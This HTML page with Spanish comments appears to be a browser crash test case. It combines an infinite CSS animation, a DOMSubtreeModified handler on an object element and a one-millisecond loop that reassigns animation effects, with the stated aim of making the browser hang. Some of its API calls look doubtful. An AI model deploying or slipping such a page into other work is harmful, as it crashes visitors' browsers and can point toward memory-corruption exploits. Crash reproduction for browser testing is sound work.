<!DOCTYPE html>
<html>
<head>
<style>
@keyframes crash { from {} to {} }
cite {
  animation: crash 1ms infinite;
}
</style>
</head>
<body onload="main()">

<object type="image/png">
  <cite></cite>
  <dl hidden></dl>
</object>

<script>
const object = document.querySelector("object");
const cite = document.querySelector("cite");
const dl = document.querySelector("dl");

function main() {
  object.addEventListener("DOMSubtreeModified", onModify);

  // Forzar animación infinita sobre <cite>
  cite.style.animationIterationCount = "infinite";

  // Cambiar el recurso para desencadenar el evento
  object.data = "x";

  // Iniciar bucle agresivo de reasignación
  setInterval(() => {
    try {
      const anim = cite.getAnimations()[0];
      if (anim) {
        anim.effect = new KeyframeEffect(dl, {}, new AnimationEffectTiming());
      }
    } catch (e) {}
  }, 1);
}

function onModify() {
  try {
    object.width = "1em";
    object.codeBase; // trigger legacy layout access
    cite.style.animationDuration = Math.random() + "ms";
  } catch (e) {}
}
</script>

<p style="color:white;background:#111;font-family:sans-serif;padding:1em;">
  Si ves este mensaje y el navegador no se ha colgado, la prueba ha fallado.
</p>

</body>
</html>
